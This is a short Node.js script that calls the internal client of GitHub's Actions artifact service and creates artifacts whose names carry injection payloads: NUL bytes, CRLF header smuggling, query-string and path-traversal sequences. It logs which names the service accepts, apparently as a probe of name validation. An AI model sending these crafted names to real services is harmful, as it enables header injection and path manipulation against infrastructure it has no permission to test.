import {createHash} from 'node:crypto';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 1});
const stamp = process.env.GITHUB_RUN_ID;
const injections = [
  ['nul-cr', `safe\0\r-x-${stamp}.json`],
  ['nul-lf', `safe\0\n-x-${stamp}.json`],
  ['nul-crlf', `safe\0\r\nContent-Type: application/json\u0085-x-${stamp}.json`],
  ['cr-nul-lf', `safe\r\0\nContent-Type: application/json\u0085-x-${stamp}.json`],
  ['nul-quote', `safe\0"&api-version=2012-02-12-x-${stamp}.json`],
  ['nul-question', `safe\0?api-version=2012-02-12-x-${stamp}.json`],
  ['nul-slash', `safe\0/../x-${stamp}.json`],
  ['nul-backslash', `safe\0\\x-${stamp}.json`],
  ['nul-colon', `safe\0:x-${stamp}.json`],
  ['pct-crlf', `safe%00%0d%0aContent-Type%3Aapplication%2Fjson%85-x-${stamp}.json`],
];
const body = Buffer.from('{"probe":"name-edge"}');
const digest = createHash('sha256').update(body).digest('hex');
const report = [];
for (const [label, name] of injections) {
  try {
    const created = await client.CreateArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
      version: 7,
      mimeType: StringValue.create({value: 'application/json'}),
    });
    await new BlobClient(created.signedUploadUrl).getBlockBlobClient().uploadData(body);
    const finalized = await client.FinalizeArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
      size: String(body.length),
      hash: StringValue.create({value: `sha256:${digest}`}),
    });
    report.push({label, ok: true, id: finalized.artifactId,
      nameBase64: Buffer.from(name).toString('base64')});
  } catch (error) {
    report.push({label, ok: false, error: String(error).split(': ').at(-1).slice(0, 180)});
  }
}
console.log(`NAME_EDGE ${JSON.stringify(report)}`);
